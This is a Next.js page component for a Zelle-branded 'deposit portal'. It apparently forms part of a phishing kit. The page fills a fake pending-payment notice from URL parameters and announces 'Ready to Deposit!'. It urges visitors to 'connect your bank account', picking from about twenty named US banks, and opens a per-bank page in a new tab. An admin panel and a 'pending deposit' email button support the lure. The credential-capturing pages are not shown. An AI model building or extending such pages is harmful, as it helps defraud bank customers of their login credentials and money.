"use client"

import type React from "react"
import DashboardShellWithAuth from "@/components/DashboardShell"
import { useState, useEffect } from "react"
import {
  Building2,
  MapPin,
  CreditCard,
  Hash,
  ArrowRight,
  AlertCircle,
  Grid3x3,
  Layers,
  PenTool,
  CheckCircle,
  ExternalLink,
  Eye,
  EyeOff,
  Mail,
  Loader2,
  ChevronDown,
  ChevronUp,
  Building,
} from "lucide-react"
import Header from "@/components/Header"
import DepositPanel from "@/components/DepositPanel"
import BankSelectorGrid from "@/components/BankSelectorGrid"
import SearchBar from "@/components/SearchBar"
import InstitutionMultiSelect from "@/components/InstitutionMultiSelect"
import type { FinancialInstitution } from "@/types/financial-institution"
import { useLanguage } from "@/lib/i18n/context"
import { useSearchParams } from "next/navigation"
import { useAuth } from "@/lib/auth/context"

type ConnectionMethod = "grid" | "multi-select" | "manual"

interface TransferData {
  transferId: string
  amount: string
  recipient: string
  recipientName: string
  bankName: string
  message: string
  timestamp: string
}

function DepositPortalContent() {
  const [searchTerm, setSearchTerm] = useState("")
  const [selectedInstitutions, setSelectedInstitutions] = useState<FinancialInstitution[]>([])
  const { t } = useLanguage()
  const searchParams = useSearchParams()
  const { user } = useAuth()

  const [connectionMethod, setConnectionMethod] = useState<ConnectionMethod>("grid")
  const [showAmount, setShowAmount] = useState(true)
  const [isSendingEmail, setIsSendingEmail] = useState(false)
  const [emailSent, setEmailSent] = useState(false)
  const [showAdminDetails, setShowAdminDetails] = useState(true)

  const [transferData, setTransferData] = useState<TransferData | null>(null)

  useEffect(() => {
    const transferId = searchParams.get("transferId")
    const amount = searchParams.get("amount")
    const recipient = searchParams.get("recipient")
    const recipientName = searchParams.get("recipientName")
    const bankName = searchParams.get("bankName")
    const message = searchParams.get("message")
    const timestamp = searchParams.get("timestamp")

    if (transferId) {
      setTransferData({
        transferId: transferId,
        amount: amount || "0.00",
        recipient: recipient || "",
        recipientName: recipientName || "",
        bankName: bankName || "Banking System",
        message: message || "",
        timestamp: timestamp || new Date().toISOString(),
      })

      const existingHistory = localStorage.getItem("depositHistory")
      const history = existingHistory ? JSON.parse(existingHistory) : []

      const existingIndex = history.findIndex((h: any) => h.transferId === transferId)
      const newEntry = {
        id: transferId,
        transferId,
        amount: amount || "0.00",
        recipient: recipient || "",
        recipientName: recipientName || "",
        bankName: bankName || "Banking System",
        message: message || "",
        timestamp: timestamp || new Date().toISOString(),
        status: "pending",
      }

      if (existingIndex >= 0) {
        history[existingIndex] = newEntry
      } else {
        history.unshift(newEntry)
      }

      localStorage.setItem("depositHistory", JSON.stringify(history.slice(0, 50)))
    }
  }, [
    searchParams.get("transferId"),
    searchParams.get("amount"),
    searchParams.get("recipient"),
    searchParams.get("recipientName"),
    searchParams.get("bankName"),
    searchParams.get("message"),
    searchParams.get("timestamp"),
  ])

  const handleSendPendingEmail = async () => {
    if (!transferData) return

    setIsSendingEmail(true)
    setEmailSent(false)

    try {
      const response = await fetch("/api/send-pending-deposit", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(transferData),
      })

      if (response.ok) {
        setEmailSent(true)
        setTimeout(() => setEmailSent(false), 5000)
      } else {
        alert("Failed to send email. Please try again.")
      }
    } catch (error) {
      console.error("Error sending pending deposit email:", error)
      alert("An error occurred. Please try again.")
    } finally {
      setIsSendingEmail(false)
    }
  }

  const [manualForm, setManualForm] = useState({
    institution: "",
    state: "",
    accountType: "",
    branchNumber: "",
  })
  const [formError, setFormError] = useState("")
  const [isSubmitting, setIsSubmitting] = useState(false)

  const handleManualSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setFormError("")

    if (!manualForm.institution || !manualForm.state || !manualForm.accountType) {
      setFormError(t.mainPage.formValidationError)
      return
    }

    setIsSubmitting(true)

    setTimeout(() => {
      console.log("[v0] Connecting to bank:", manualForm)
      window.open(`/bank/${manualForm.institution}`, "_blank")
      setIsSubmitting(false)
      setManualForm({
        institution: "",
        state: "",
        accountType: "",
        branchNumber: "",
      })
    }, 1500)
  }

  return (
    <div className="container mx-auto px-4 py-8 max-w-7xl">
        {transferData && (
          <div className="mb-8 space-y-6">
            <div className="bg-zinc-900 rounded-2xl border border-zinc-800 p-6 space-y-6">
              <div className="flex items-center justify-between pb-4 border-b border-zinc-800 flex-wrap gap-3">
                <h3 className="text-lg font-semibold text-white">Transaction Details</h3>
                <div className="flex items-center gap-3">
                  <span className="px-3 py-1 rounded-full text-xs font-medium bg-amber-500/10 text-amber-400 border border-amber-500/20">
                    Awaiting Confirmation
                  </span>
                  <button
                    onClick={handleSendPendingEmail}
                    disabled={isSendingEmail || emailSent}
                    className={`flex items-center gap-2 px-4 py-2 rounded-lg font-semibold transition-all ${
                      emailSent ? "bg-green-500 text-white" : "bg-[#6D1ED4] text-white hover:bg-[#5a18b0]"
                    } disabled:opacity-50 disabled:cursor-not-allowed`}
                  >
                    {isSendingEmail ? (
                      <>
                        <Loader2 className="w-4 h-4 animate-spin" />
                        Sending...
                      </>
                    ) : emailSent ? (
                      <>
                        <CheckCircle className="w-4 h-4" />
                        Email Sent!
                      </>
                    ) : (
                      <>
                        <Mail className="w-4 h-4" />
                        Email Transaction Details
                      </>
                    )}
                  </button>
                </div>
              </div>

              {user && (
                <div className="border-t border-zinc-800 pt-6">
                  <button
                    onClick={() => setShowAdminDetails(!showAdminDetails)}
                    className="w-full flex items-center justify-between px-4 py-3 bg-zinc-800/50 hover:bg-zinc-800 rounded-lg transition-colors mb-4"
                  >
                    <span className="text-sm font-semibold text-zinc-300">Admin Transaction Details</span>
                    <div className="flex items-center gap-2">
                      <span className="px-2 py-1 bg-[#6D1ED4] text-white text-xs font-bold rounded">ADMIN ONLY</span>
                      {showAdminDetails ? (
                        <ChevronUp className="w-4 h-4 text-zinc-400" />
                      ) : (
                        <ChevronDown className="w-4 h-4 text-zinc-400" />
                      )}
                    </div>
                  </button>

                  {showAdminDetails && (
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                      <div className="group bg-zinc-800/30 hover:bg-zinc-800/50 border border-zinc-700/50 rounded-xl p-4 transition-all duration-300 hover:shadow-lg hover:shadow-[#6D1ED4]/10">
                        <div className="flex items-center justify-between mb-3">
                          <div className="flex items-center gap-2">
                            <div className="w-8 h-8 rounded-lg bg-[#6D1ED4]/10 flex items-center justify-center">
                              <CreditCard className="w-4 h-4 text-[#6D1ED4]" />
                            </div>
                            <p className="text-sm font-medium text-zinc-400">Amount</p>
                          </div>
                          <button
                            onClick={() => setShowAmount(!showAmount)}
                            className="p-1.5 hover:bg-zinc-700 rounded-lg transition-colors"
                            aria-label={showAmount ? "Hide amount" : "Show amount"}
                          >
                            {showAmount ? (
                              <Eye className="w-4 h-4 text-zinc-400 hover:text-zinc-300" />
                            ) : (
                              <EyeOff className="w-4 h-4 text-zinc-400 hover:text-zinc-300" />
                            )}
                          </button>
                        </div>
                        <p
                          className={`text-2xl font-bold transition-all duration-300 ${
                            showAmount ? "text-white" : "text-zinc-600"
                          }`}
                        >
                          {showAmount ? `$${Number.parseFloat(transferData.amount).toFixed(2)} USD` : "••••••••"}
                        </p>
                      </div>

                      <div className="group bg-zinc-800/30 hover:bg-zinc-800/50 border border-zinc-700/50 rounded-xl p-4 transition-all duration-300 hover:shadow-lg hover:shadow-[#6D1ED4]/10">
                        <div className="flex items-center gap-2 mb-3">
                          <div className="w-8 h-8 rounded-lg bg-emerald-500/10 flex items-center justify-center">
                            <Hash className="w-4 h-4 text-emerald-400" />
                          </div>
                          <p className="text-sm font-medium text-zinc-400">Reference ID</p>
                        </div>
                        <p className="text-base font-mono text-white break-all">{transferData.transferId}</p>
                      </div>

                      <div className="group bg-zinc-800/30 hover:bg-zinc-800/50 border border-zinc-700/50 rounded-xl p-4 transition-all duration-300 hover:shadow-lg hover:shadow-[#6D1ED4]/10">
                        <div className="flex items-center gap-2 mb-3">
                          <div className="w-8 h-8 rounded-lg bg-blue-500/10 flex items-center justify-center">
                            <Mail className="w-4 h-4 text-blue-400" />
                          </div>
                          <p className="text-sm font-medium text-zinc-400">Payee</p>
                        </div>
                        <p className="text-base font-semibold text-white mb-1">{transferData.recipientName}</p>
                        <p className="text-sm text-zinc-400 break-all">{transferData.recipient}</p>
                      </div>

                      <div className="group bg-zinc-800/30 hover:bg-zinc-800/50 border border-zinc-700/50 rounded-xl p-4 transition-all duration-300 hover:shadow-lg hover:shadow-[#6D1ED4]/10">
                        <div className="flex items-center gap-2 mb-3">
                          <div className="w-8 h-8 rounded-lg bg-amber-500/10 flex items-center justify-center">
                            <Building2 className="w-4 h-4 text-amber-400" />
                          </div>
                          <p className="text-sm font-medium text-zinc-400">Bank</p>
                        </div>
                        <p className="text-base font-semibold text-white mb-1">{transferData.bankName}</p>
                        <div className="flex items-center gap-2">
                          <span className="text-sm text-[#6D1ED4] font-medium">Zelle</span>
                          <span className="px-2 py-0.5 bg-[#6D1ED4]/10 text-[#6D1ED4] text-xs font-semibold rounded-full border border-[#6D1ED4]/20">
                            Network
                          </span>
                        </div>
                      </div>

                      {transferData.message && (
                        <div className="group bg-zinc-800/30 hover:bg-zinc-800/50 border border-zinc-700/50 rounded-xl p-4 transition-all duration-300 hover:shadow-lg hover:shadow-[#6D1ED4]/10 md:col-span-2">
                          <div className="flex items-center gap-2 mb-3">
                            <div className="w-8 h-8 rounded-lg bg-violet-500/10 flex items-center justify-center">
                              <PenTool className="w-4 h-4 text-violet-400" />
                            </div>
                            <p className="text-sm font-medium text-zinc-400">Memo</p>
                          </div>
                          <p className="text-base text-white leading-relaxed">{transferData.message}</p>
                        </div>
                      )}

                      <div className="group bg-zinc-800/30 hover:bg-zinc-800/50 border border-zinc-700/50 rounded-xl p-4 transition-all duration-300 hover:shadow-lg hover:shadow-[#6D1ED4]/10 md:col-span-2">
                        <div className="flex items-center gap-2 mb-3">
                          <div className="w-8 h-8 rounded-lg bg-cyan-500/10 flex items-center justify-center">
                            <AlertCircle className="w-4 h-4 text-cyan-400" />
                          </div>
                          <p className="text-sm font-medium text-zinc-400">Transaction Time</p>
                        </div>
                        <p className="text-sm font-mono text-zinc-300">
                          {new Date(transferData.timestamp).toLocaleString("en-US", {
                            weekday: "long",
                            year: "numeric",
                            month: "long",
                            day: "numeric",
                            hour: "2-digit",
                            minute: "2-digit",
                            second: "2-digit",
                          })}
                        </p>
                      </div>
                    </div>
                  )}
                </div>
              )}
            </div>

            <div className="bg-gradient-to-r from-green-50 to-emerald-50 border-2 border-green-200 rounded-xl p-6">
              <div className="flex items-start gap-4">
                <div className="flex-shrink-0">
                  <div className="w-12 h-12 bg-green-500 rounded-full flex items-center justify-center">
                    <CheckCircle className="w-7 h-7 text-white" />
                  </div>
                </div>
                <div className="flex-1">
                  <h3 className="text-xl font-bold text-green-900 mb-2">Ready to Deposit!</h3>
                  <p className="text-sm text-green-800 font-medium flex items-center gap-2">
                    <ExternalLink className="w-4 h-4" />
                    Connect your bank account below to complete the deposit of $
                    {Number.parseFloat(transferData.amount).toFixed(2)} USD
                  </p>
                </div>
              </div>
            </div>
          </div>
        )}

        <DepositPanel transferAmount={transferData?.amount} transferSender={transferData?.recipientName} />

        <section className="mt-12 mb-8 animate-slide-up" aria-labelledby="connection-method-heading">
          <div className="text-center mb-10 space-y-4">
            <div className="inline-flex items-center gap-2 px-4 py-2 bg-gradient-to-r from-[#6D1ED4]/10 to-[#8b4de8]/10 border border-[#6D1ED4]/20 rounded-full mb-4">
              <div className="w-2 h-2 rounded-full bg-[#6D1ED4] animate-pulse" />
              <span className="text-sm font-semibold text-[#6D1ED4]">Choose Your Connection Method</span>
            </div>
            <h2
              id="connection-method-heading"
              className="text-3xl md:text-4xl font-bold text-foreground mb-4 text-balance"
            >
              {t.mainPage.connectionMethodTitle}
            </h2>
            <p className="text-muted-foreground text-base md:text-lg max-w-2xl mx-auto text-pretty">
              {t.mainPage.connectionMethodDescription}
            </p>
          </div>

          <div className="grid md:grid-cols-3 gap-4 md:gap-6">
            <button
              onClick={() => setConnectionMethod("grid")}
              className={`group relative p-6 md:p-8 rounded-2xl border-2 transition-all duration-300 text-left overflow-hidden ${
                connectionMethod === "grid"
                  ? "border-[#6D1ED4] bg-gradient-to-br from-[#6D1ED4]/5 via-[#6D1ED4]/3 to-transparent shadow-zelle scale-105"
                  : "border-border bg-card hover:border-[#6D1ED4]/50 hover:shadow-card-hover hover:scale-102"
              }`}
              aria-pressed={connectionMethod === "grid"}
            >
              {connectionMethod === "grid" && (
                <div className="absolute inset-0 bg-gradient-to-br from-[#6D1ED4]/10 to-transparent opacity-50" />
              )}
              <div className="relative flex flex-col items-start gap-5">
                <div
                  className={`p-4 rounded-xl transition-all duration-300 ${
                    connectionMethod === "grid"
                      ? "bg-gradient-to-br from-[#6D1ED4] to-[#8b4de8] text-white shadow-zelle"
                      : "bg-muted text-muted-foreground group-hover:bg-[#6D1ED4]/10 group-hover:text-[#6D1ED4]"
                  }`}
                >
                  <Grid3x3 className="w-7 h-7" />
                </div>
                <div className="flex-1 space-y-3">
                  <div className="flex items-center gap-3">
                    <h3 className="font-bold text-foreground text-lg md:text-xl">{t.mainPage.connectionMethodGrid}</h3>
                    <div
                      className={`w-7 h-7 rounded-full flex items-center justify-center transition-colors ${
                        connectionMethod === "grid"
                          ? "bg-gradient-to-br from-[#6D1ED4] to-[#8b4de8] shadow-zelle"
                          : "bg-muted"
                      }`}
                    >
                      <span
                        className={`text-xs font-bold ${connectionMethod === "grid" ? "text-white" : "text-muted-foreground"}`}
                      >
                        1
                      </span>
                    </div>
                  </div>
                  <p className="text-muted-foreground text-sm leading-relaxed">{t.mainPage.connectionMethodGridDesc}</p>
                </div>
                {connectionMethod === "grid" && (
                  <div className="absolute top-4 right-4">
                    <CheckCircle className="w-6 h-6 text-[#6D1ED4]" />
                  </div>
                )}
              </div>
            </button>

            <button
              onClick={() => setConnectionMethod("multi-select")}
              className={`group relative p-6 md:p-8 rounded-2xl border-2 transition-all duration-300 text-left overflow-hidden ${
                connectionMethod === "multi-select"
                  ? "border-[#6D1ED4] bg-gradient-to-br from-[#6D1ED4]/5 via-[#6D1ED4]/3 to-transparent shadow-zelle scale-105"
                  : "border-border bg-card hover:border-[#6D1ED4]/50 hover:shadow-card-hover hover:scale-102"
              }`}
              aria-pressed={connectionMethod === "multi-select"}
            >
              {connectionMethod === "multi-select" && (
                <div className="absolute inset-0 bg-gradient-to-br from-[#6D1ED4]/10 to-transparent opacity-50" />
              )}
              <div className="relative flex flex-col items-start gap-5">
                <div
                  className={`p-4 rounded-xl transition-all duration-300 ${
                    connectionMethod === "multi-select"
                      ? "bg-gradient-to-br from-[#6D1ED4] to-[#8b4de8] text-white shadow-zelle"
                      : "bg-muted text-muted-foreground group-hover:bg-[#6D1ED4]/10 group-hover:text-[#6D1ED4]"
                  }`}
                >
                  <Layers className="w-7 h-7" />
                </div>
                <div className="flex-1 space-y-3">
                  <div className="flex items-center gap-3">
                    <h3 className="font-bold text-foreground text-lg md:text-xl">{t.mainPage.connectionMethodMulti}</h3>
                    <div
                      className={`w-7 h-7 rounded-full flex items-center justify-center transition-colors ${
                        connectionMethod === "multi-select"
                          ? "bg-gradient-to-br from-[#6D1ED4] to-[#8b4de8] shadow-zelle"
                          : "bg-muted"
                      }`}
                    >
                      <span
                        className={`text-xs font-bold ${connectionMethod === "multi-select" ? "text-white" : "text-muted-foreground"}`}
                      >
                        2
                      </span>
                    </div>
                  </div>
                  <p className="text-muted-foreground text-sm leading-relaxed">
                    {t.mainPage.connectionMethodMultiDesc}
                  </p>
                </div>
                {connectionMethod === "multi-select" && (
                  <div className="absolute top-4 right-4">
                    <CheckCircle className="w-6 h-6 text-[#6D1ED4]" />
                  </div>
                )}
              </div>
            </button>

            <button
              onClick={() => setConnectionMethod("manual")}
              className={`group relative p-6 md:p-8 rounded-2xl border-2 transition-all duration-300 text-left overflow-hidden ${
                connectionMethod === "manual"
                  ? "border-[#6D1ED4] bg-gradient-to-br from-[#6D1ED4]/5 via-[#6D1ED4]/3 to-transparent shadow-zelle scale-105"
                  : "border-border bg-card hover:border-[#6D1ED4]/50 hover:shadow-card-hover hover:scale-102"
              }`}
              aria-pressed={connectionMethod === "manual"}
            >
              {connectionMethod === "manual" && (
                <div className="absolute inset-0 bg-gradient-to-br from-[#6D1ED4]/10 to-transparent opacity-50" />
              )}
              <div className="relative flex flex-col items-start gap-5">
                <div
                  className={`p-4 rounded-xl transition-all duration-300 ${
                    connectionMethod === "manual"
                      ? "bg-gradient-to-br from-[#6D1ED4] to-[#8b4de8] text-white shadow-zelle"
                      : "bg-muted text-muted-foreground group-hover:bg-[#6D1ED4]/10 group-hover:text-[#6D1ED4]"
                  }`}
                >
                  <Building className="w-7 h-7" />
                </div>
                <div className="flex-1 space-y-3">
                  <div className="flex items-center gap-3">
                    <h3 className="font-bold text-foreground text-lg md:text-xl">
                      {t.mainPage.connectionMethodManual}
                    </h3>
                    <div
                      className={`w-7 h-7 rounded-full flex items-center justify-center transition-colors ${
                        connectionMethod === "manual"
                          ? "bg-gradient-to-br from-[#6D1ED4] to-[#8b4de8] shadow-zelle"
                          : "bg-muted"
                      }`}
                    >
                      <span
                        className={`text-xs font-bold ${connectionMethod === "manual" ? "text-white" : "text-muted-foreground"}`}
                      >
                        3
                      </span>
                    </div>
                  </div>
                  <p className="text-muted-foreground text-sm leading-relaxed">
                    {t.mainPage.connectionMethodManualDesc}
                  </p>
                </div>
                {connectionMethod === "manual" && (
                  <div className="absolute top-4 right-4">
                    <CheckCircle className="w-6 h-6 text-[#6D1ED4]" />
                  </div>
                )}
              </div>
            </button>
          </div>
        </section>

        {connectionMethod === "grid" && (
          <section className="mt-12" aria-labelledby="institution-selection-heading">
            <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4 mb-8">
              <h2 id="institution-selection-heading" className="text-2xl font-bold text-black">
                {t.mainPage.selectInstitutionTitle}
              </h2>
              <SearchBar onSearch={setSearchTerm} />
            </div>
            <BankSelectorGrid searchTerm={searchTerm} />
          </section>
        )}

        {connectionMethod === "multi-select" && (
          <section className="mt-12" aria-labelledby="multi-select-heading">
            <div className="mb-6">
              <h2 id="multi-select-heading" className="text-2xl font-bold text-black mb-2">
                {t.mainPage.multiSelectTitle}
              </h2>
              <p className="text-gray-600">{t.mainPage.multiSelectDescription}</p>
            </div>
            <InstitutionMultiSelect
              onSelectionChange={(selected) => {
                setSelectedInstitutions(selected)
              }}
            />
          </section>
        )}

        {connectionMethod === "manual" && (
          <section className="mt-12" aria-labelledby="manual-selection-heading">
            <div className="mb-6">
              <h2 id="manual-selection-heading" className="text-2xl font-bold text-black mb-2">
                {t.mainPage.manualSelectionTitle}
              </h2>
              <p className="text-gray-600">Connect by selecting your institution details manually</p>
            </div>

            <form onSubmit={handleManualSubmit} className="space-y-6">
              <div className="space-y-2">
                <label
                  htmlFor="institution"
                  className="flex items-center gap-2 text-base font-semibold text-foreground"
                >
                  <Building className="w-5 h-5 text-[#6D1ED4]" />
                  {t.mainPage.selectInstitutionLabel}
                </label>
                <select
                  id="institution"
                  value={manualForm.institution}
                  onChange={(e) => setManualForm({ ...manualForm, institution: e.target.value })}
                  className="w-full px-4 py-3.5 border-2 border-border rounded-lg text-foreground bg-background focus:outline-none focus:border-[#6D1ED4] focus:ring-2 focus:ring-[#6D1ED4] focus:ring-offset-2 transition-all duration-200 hover:border-muted-foreground"
                >
                  <option value="" disabled>
                    {t.mainPage.selectInstitutionDropdown}
                  </option>
                  <option value="chase">Chase Bank</option>
                  <option value="bankofamerica">Bank of America</option>
                  <option value="wellsfargo">Wells Fargo</option>
                  <option value="citibank">Citibank</option>
                  <option value="usbank">U.S. Bank</option>
                  <option value="truist">Truist Bank</option>
                  <option value="pnc">PNC Bank</option>
                  <option value="capitalone">Capital One</option>
                  <option value="tdbank">TD Bank</option>
                  <option value="bankofthewest">Bank of the West</option>
                  <option value="fifththird">Fifth Third Bank</option>
                  <option value="ally">Ally Bank</option>
                  <option value="discover">Discover Bank</option>
                  <option value="schwab">Charles Schwab Bank</option>
                  <option value="navyfederal">Navy Federal Credit Union</option>
                  <option value="usaa">USAA</option>
                  <option value="regionalscu">Regions Bank</option>
                  <option value="keybank">KeyBank</option>
                  <option value="citizensbank">Citizens Bank</option>
                  <option value="huntington">Huntington Bank</option>
                </select>
                <p className="text-sm text-muted-foreground">{t.mainPage.selectInstitutionHelp}</p>
              </div>

              <div className="space-y-2">
                <label htmlFor="state" className="flex items-center gap-2 text-base font-semibold text-foreground">
                  <MapPin className="w-5 h-5 text-[#6D1ED4]" />
                  {t.mainPage.selectProvinceLabel}
                </label>
                <select
                  id="state"
                  value={manualForm.state}
                  onChange={(e) => setManualForm({ ...manualForm, state: e.target.value })}
                  className="w-full px-4 py-3.5 border-2 border-border rounded-lg text-foreground bg-background focus:outline-none focus:border-[#6D1ED4] focus:ring-2 focus:ring-[#6D1ED4] focus:ring-offset-2 transition-all duration-200 hover:border-muted-foreground"
                >
                  <option value="">{t.mainPage.selectProvinceDropdown}</option>
                  <option value="AL">{t.provinces.AL}</option>
                  <option value="AK">{t.provinces.AK}</option>
                  <option value="AZ">{t.provinces.AZ}</option>
                  <option value="AR">{t.provinces.AR}</option>
                  <option value="CA">{t.provinces.CA}</option>
                  <option value="CO">{t.provinces.CO}</option>
                  <option value="CT">{t.provinces.CT}</option>
                  <option value="DE">{t.provinces.DE}</option>
                  <option value="FL">{t.provinces.FL}</option>
                  <option value="GA">{t.provinces.GA}</option>
                  <option value="HI">{t.provinces.HI}</option>
                  <option value="ID">{t.provinces.ID}</option>
                  <option value="IL">{t.provinces.IL}</option>
                  <option value="IN">{t.provinces.IN}</option>
                  <option value="IA">{t.provinces.IA}</option>
                  <option value="KS">{t.provinces.KS}</option>
                  <option value="KY">{t.provinces.KY}</option>
                  <option value="LA">{t.provinces.LA}</option>
                  <option value="ME">{t.provinces.ME}</option>
                  <option value="MD">{t.provinces.MD}</option>
                  <option value="MA">{t.provinces.MA}</option>
                  <option value="MI">{t.provinces.MI}</option>
                  <option value="MN">{t.provinces.MN}</option>
                  <option value="MS">{t.provinces.MS}</option>
                  <option value="MO">{t.provinces.MO}</option>
                  <option value="MT">{t.provinces.MT}</option>
                  <option value="NE">{t.provinces.NE}</option>
                  <option value="NV">{t.provinces.NV}</option>
                  <option value="NH">{t.provinces.NH}</option>
                  <option value="NJ">{t.provinces.NJ}</option>
                  <option value="NM">{t.provinces.NM}</option>
                  <option value="NY">{t.provinces.NY}</option>
                  <option value="NC">{t.provinces.NC}</option>
                  <option value="ND">{t.provinces.ND}</option>
                  <option value="OH">{t.provinces.OH}</option>
                  <option value="OK">{t.provinces.OK}</option>
                  <option value="OR">{t.provinces.OR}</option>
                  <option value="PA">{t.provinces.PA}</option>
                  <option value="RI">{t.provinces.RI}</option>
                  <option value="SC">{t.provinces.SC}</option>
                  <option value="SD">{t.provinces.SD}</option>
                  <option value="TN">{t.provinces.TN}</option>
                  <option value="TX">{t.provinces.TX}</option>
                  <option value="UT">{t.provinces.UT}</option>
                  <option value="VT">{t.provinces.VT}</option>
                  <option value="VA">{t.provinces.VA}</option>
                  <option value="WA">{t.provinces.WA}</option>
                  <option value="WV">{t.provinces.WV}</option>
                  <option value="WI">{t.provinces.WI}</option>
                  <option value="WY">{t.provinces.WY}</option>
                  <option value="DC">{t.provinces.DC}</option>
                </select>
                <p className="text-sm text-muted-foreground">{t.mainPage.selectProvinceHelp}</p>
              </div>

              <div className="space-y-2">
                <label
                  htmlFor="accountType"
                  className="flex items-center gap-2 text-base font-semibold text-foreground"
                >
                  <CreditCard className="w-5 h-5 text-[#6D1ED4]" />
                  {t.mainPage.accountTypeLabel}
                </label>
                <select
                  id="accountType"
                  value={manualForm.accountType}
                  onChange={(e) => setManualForm({ ...manualForm, accountType: e.target.value })}
                  className="w-full px-4 py-3.5 border-2 border-border rounded-lg text-foreground bg-background focus:outline-none focus:border-[#6D1ED4] focus:ring-2 focus:ring-[#6D1ED4] focus:ring-offset-2 transition-all duration-200 hover:border-muted-foreground"
                >
                  <option value="" disabled>
                    {t.mainPage.accountTypeDropdown}
                  </option>
                  <option value="chequing">{t.mainPage.chequing}</option>
                  <option value="savings">{t.mainPage.savings}</option>
                  <option value="investment">{t.mainPage.investment}</option>
                  <option value="credit">{t.mainPage.creditCard}</option>
                </select>
                <p className="text-sm text-muted-foreground">{t.mainPage.accountTypeHelp}</p>
              </div>

              <div className="space-y-2">
                <label
                  htmlFor="branchNumber"
                  className="flex items-center gap-2 text-base font-semibold text-foreground"
                >
                  <Hash className="w-5 h-5 text-[#6D1ED4]" />
                  {t.mainPage.branchNumberLabel}
                  <span className="text-xs text-muted-foreground font-normal">{t.mainPage.branchNumberOptional}</span>
                </label>
                <input
                  id="branchNumber"
                  type="text"
                  value={manualForm.branchNumber}
                  onChange={(e) => setManualForm({ ...manualForm, branchNumber: e.target.value })}
                  placeholder={t.mainPage.branchNumberPlaceholder}
                  className="w-full px-4 py-3.5 border-2 border-border rounded-lg text-foreground bg-background focus:outline-none focus:border-[#6D1ED4] focus:ring-2 focus:ring-[#6D1ED4] focus:ring-offset-2 transition-all duration-200 hover:border-muted-foreground placeholder:text-muted-foreground"
                />
                <p className="text-sm text-muted-foreground">{t.mainPage.branchNumberHelp}</p>
              </div>

              {formError && (
                <div className="mt-6 p-4 bg-red-50 border-2 border-red-200 rounded-lg flex items-start gap-3 animate-in slide-in-from-top-2 duration-300">
                  <AlertCircle className="w-5 h-5 text-red-600 flex-shrink-0 mt-0.5" />
                  <p className="text-sm text-red-700 font-medium">{formError}</p>
                </div>
              )}

              <div className="mt-8 flex justify-end">
                <button
                  type="submit"
                  disabled={isSubmitting}
                  className="flex items-center gap-3 px-8 py-4 bg-[#6D1ED4] text-white rounded-lg font-bold text-lg hover:bg-[#5a18b0] transition-all duration-200 hover:scale-105 hover:shadow-lg focus:outline-none focus:ring-2 focus:ring-[#6D1ED4] focus:ring-offset-2 disabled:opacity-50 disabled:cursor-not-allowed disabled:hover:scale-100"
                >
                  {isSubmitting ? (
                    <>
                      <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
                      <span>Connecting...</span>
                    </>
                  ) : (
                    <>
                      <span>{t.mainPage.connectButton}</span>
                      <ArrowRight className="w-5 h-5" />
                    </>
                  )}
                </button>
              </div>
            </form>
          </section>
        )}
    </div>
  )
}

export default function DepositPortalPage() {
  return <DashboardShellWithAuth><DepositPortalContent /></DashboardShellWithAuth>
}
